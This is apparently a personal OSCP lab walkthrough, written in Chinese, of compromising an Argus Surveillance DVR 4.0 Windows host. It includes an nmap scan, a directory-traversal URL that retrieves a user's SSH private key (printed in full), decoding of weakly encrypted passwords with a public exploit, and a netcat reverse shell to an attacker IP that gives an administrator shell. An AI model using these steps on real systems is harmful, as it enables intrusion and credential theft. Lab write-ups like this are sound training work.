## Nmap

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/DVR4]
└─$ ~/tools/nmapAutomator/nmapAutomator.sh -H 192.168.211.179 -t Full

Running a Full scan on 192.168.211.179

Host is likely running Unknown OS!


---------------------Starting Full Scan------------------------



PORT      STATE SERVICE
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
8080/tcp  open  http-proxy
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown



Making a script scan on all ports



PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)
| ssh-hostkey:
|   3072 21:25:f0:53:b4:99:0f:34:de:2d:ca:bc:5d:fe:20:ce (RSA)
|_  384 e7:96:f3:6a:d8:92:07:5a:bf:37:06:86:0a:31:73:19 (ECDSA)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
8080/tcp  open  http-proxy
|_http-generator: Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 200 OK
|     Connection: Keep-Alive
|     Keep-Alive: timeout=15, max=4
|     Content-Type: text/html
|     Content-Length: 985
|     <HTML>
|     <HEAD>
|     <TITLE>
|     Argus Surveillance DVR
|     </TITLE>
|     <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
|     <meta name="GENERATOR" content="Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]">
|     <frameset frameborder="no" border="0" rows="75,*,88">
|     <frame name="Top" frameborder="0" scrolling="auto" noresize src="CamerasTopFrame.html" marginwidth="0" marginheight="0">
|     <frame name="ActiveXFrame" frameborder="0" scrolling="auto" noresize src="ActiveXIFrame.html" marginwidth="0" marginheight="0">
|     <frame name="CamerasTable" frameborder="0" scrolling="auto" noresize src="CamerasBottomFrame.html" marginwidth="0" marginheight="0">
|     <noframes>
|     <p>This page uses frames, but your browser doesn't support them.</p>
|_    </noframes>
|_http-title: Argus Surveillance DVR
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2023-09-01T11:45:53
|_  start_date: N/A




---------------------Finished all scans------------------------


Completed in 7 minute(s) and 54 second(s)
```

訪問 8080 port 可看到 Argus Surveillance 版本為 4.0

![[截圖 2023-09-01 下午7.53.28.png]]

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/DVR4]
└─$ searchsploit "Argus Surveillance"
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
Argus Surveillance DVR 4.0 - Unquoted Service Path                                         | windows/local/50261.txt
Argus Surveillance DVR 4.0 - Weak Password Encryption                                      | windows/local/50130.py
Argus Surveillance DVR 4.0.0.0 - Directory Traversal                                       | windows_x86/webapps/45296.txt
Argus Surveillance DVR 4.0.0.0 - Privilege Escalation                                      | windows_x86/local/45312.c
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Directory Traversal 利用成功！

![[截圖 2023-09-01 下午7.55.42.png]]

可以 Directory Traversal，又有 ssh，嘗試查看 ssh key，先確認有哪些 User

![[截圖 2023-09-01 下午8.38.57.png]]

查看 Viewer 的 ssh key

```http
http://192.168.211.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=%22
```

![[截圖 2023-09-01 下午8.40.03.png]]

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/DVR4]
└─$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

┌──(ouyang㉿kali)-[~/offensive-security/OSCP/DVR4]
└─$ chmod 600 id_rsa

┌──(ouyang㉿kali)-[~/offensive-security/OSCP/DVR4]
└─$ ssh -i id_rsa Viewer@192.168.211.179
Load key "id_rsa": error in libcrypto
Viewer@192.168.211.179's password:


┌──(ouyang㉿kali)-[~/offensive-security/OSCP/DVR4]
└─$ vim id_rsa

┌──(ouyang㉿kali)-[~/offensive-security/OSCP/DVR4]
└─$ ssh -i id_rsa Viewer@192.168.211.179
Microsoft Windows [Version 10.0.19044.1645]
(c) Microsoft Corporation. All rights reserved.

C:\Users\viewer>
```

成功登入！ (記得要把 id_rsa 權限改成 600，否則會無法登入)

依照 50130 &  [Github](https://github.com/s3l33/CVE-2022-25012) 說明，嘗試利用 Argus Surveillance DVR 4.0 - Weak Password Encryption 弱點

```json
[Users]
LocalUsersCount=2
UserID0=434499
LoginName0=Administrator
FullName0=60CAAAFEC8753F7EE03B3B76C875EB607359F641D9BDD9BD8998AAFEEB60E03B7359E1D08998CA797359F641418D4D7BC875EB60C8759083E03BB740CA79C875EB603CD97359D9BDF6414D7BB740CA79F6419083
FullControl0=1
CanClose0=1
CanPlayback0=1
CanPTZ0=1
CanRecord0=1
CanConnect0=1
CanReceiveAlerts0=1
CanViewLogs0=1
CanViewCamerasNumber0=0
CannotBeRemoved0=1
MaxConnectionTimeInMins0=0
DailyTimeLimitInMins0=0
MonthlyTimeLimitInMins0=0
DailyTrafficLimitInKB0=0
MonthlyTrafficLimitInKB0=0
MaxStreams0=0
MaxViewers0=0
MaximumBitrateInKb0=0
AccessFromIPsOnly0=
AccessRestrictedForIPs0=
MaxBytesSent0=0
Password0=ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8
Description0=60CAAAFEC8753F7EE03B3B76C875EB607359F641D9BDD9BD8998AAFEEB60E03B7359E1D08998CA797359F641418D4D7BC875EB60C8759083E03BB740CA79C875EB603CD97359D9BDF6414D7BB740CA79F6419083
Disabled0=0
ExpirationDate0=0
Organization0=
OrganizationUnit0=
Phone10=
Phone20=
Fax0=
Email0=
Position0=
Address10=
Address20=
City0=
StateProvince0=
ZipPostalCode0=
Country0=
ComputerID0=
TrialAccount0=0
UserID1=576846
LoginName1=Viewer
FullName1=
FullControl1=1
CanClose1=1
CanPlayback1=1
CanPTZ1=1
CanRecord1=1
CanConnect1=1
CanReceiveAlerts1=1
CanViewLogs1=1
CanViewCamerasNumber1=0
CannotBeRemoved1=0
MaxConnectionTimeInMins1=0
DailyTimeLimitInMins1=0
MonthlyTimeLimitInMins1=0
DailyTrafficLimitInKB1=0
MonthlyTrafficLimitInKB1=0
MaxStreams1=0
MaxViewers1=0
MaximumBitrateInKb1=0
AccessFromIPsOnly1=
AccessRestrictedForIPs1=
MaxBytesSent1=0
Password1=5E534D7B6069F641E03BD9BD956BC875EB603CD9D8E1BD8FAAFE
Description1=
Disabled1=0
ExpirationDate1=0
Organization1=
OrganizationUnit1=
Phone11=
Phone21=
Fax1=
Email1=
Position1=
Address11=
Address21=
City1=
StateProvince1=
ZipPostalCode1=
Country1=
ComputerID1=
TrialAccount1=0
```

	重連 VPN，IP 換成 192.168.154.179

用 Password0 修改 50130 並執行

```json
# Change this :)
pass_hash = "ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8"
if (len(pass_hash)%4) != 0:
	print("[!] Error, check your password hash")
	exit()
```

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/DVR4]
└─$ python3 50130.py

#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############

[+] ECB4:1
[+] 53D1:4
[+] 6069:W
[+] F641:a
[+] E03B:t
[+] D9BD:c
[+] 956B:h
[+] FE36:D
[+] BD8F:0
[+] 3CD9:g
[-] D9A8:Unknown
```

得到帳密，但不確定最後一碼，應該是對應的字典沒更新導致

```json
Administrator / 14WatchD0g
```

用 Password1 則得到，但驗證後失敗

```json
Administrator / ImWatchingY0u
```

依照作者描述，猜測可能缺的是特殊符號

```json
# I'm too lazy to add special characters :P
characters = {
'ECB4':'1','B4A1':'2','F539':'3','53D1':'4','894E':'5',
'E155':'6','F446':'7','C48C':'8','8797':'9','BD8F':'0',
'C9F9':'A','60CA':'B','E1B0':'C','FE36':'D','E759':'E',
'E9FA':'F','39CE':'G','B434':'H','5E53':'I','4198':'J',
'8B90':'K','7666':'L','D08F':'M','97C0':'N','D869':'O',
'7357':'P','E24A':'Q','6888':'R','4AC3':'S','BE3D':'T',
'8AC5':'U','6FE0':'V','6069':'W','9AD0':'X','D8E1':'Y','C9C4':'Z',
'F641':'a','6C6A':'b','D9BD':'c','418D':'d','B740':'e',
'E1D0':'f','3CD9':'g','956B':'h','C875':'i','696C':'j',
'906B':'k','3F7E':'l','4D7B':'m','EB60':'n','8998':'o',
'7196':'p','B657':'q','CA79':'r','9083':'s','E03B':'t',
'ECB4':'1','B4A1':'2','F539':'3','53D1':'4','894E':'5',
'E155':'6','F446':'7','C48C':'8','8797':'9','BD8F':'0',
'C9F9':'A','60CA':'B','E1B0':'C','FE36':'D','E759':'E',
'E9FA':'F','39CE':'G','B434':'H','5E53':'I','4198':'J',
'8B90':'K','7666':'L','D08F':'M','97C0':'N','D869':'O',
'7357':'P','E24A':'Q','6888':'R','4AC3':'S','BE3D':'T',
'8AC5':'U','6FE0':'V','6069':'W','9AD0':'X','D8E1':'Y','C9C4':'Z',
'F641':'a','6C6A':'b','D9BD':'c','418D':'d','B740':'e',
'E1D0':'f','3CD9':'g','956B':'h','C875':'i','696C':'j',
'906B':'k','3F7E':'l','4D7B':'m','EB60':'n','8998':'o',
'7196':'p','B657':'q','CA79':'r','9083':'s','E03B':'t',
'AAFE':'u','F787':'v','C165':'w','A935':'x','B734':'y','E4BC':'z','!':'B398'}
```

為節省時間，決定依照順序暴力破解，看 ssh 是否能成功

```json
!@#$%^&*()
```

試到 $ 時成功，故 Administrator 密碼為

```json
Administrator / 14WatchD0g$
```

記得用 runas /user:Administrator 以 Administrator 權限執行

```json
C:\Users\viewer>runas /user:Administrator ".\nc.exe 192.168.45.216 443 -e cmd.exe"
Enter the password for Administrator:
Attempting to start .\nc.exe 192.168.45.216 443 -e cmd.exe as user "DVR4\Administrator" ...
```

```json
┌──(ouyang㉿kali)-[~]
└─$ nc -nvlp 443
listening on [any] 443 ...
connect to [192.168.45.216] from (UNKNOWN) [192.168.154.179] 50261
Microsoft Windows [Version 10.0.19044.1645]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
dvr4\administrator
```

提權成功！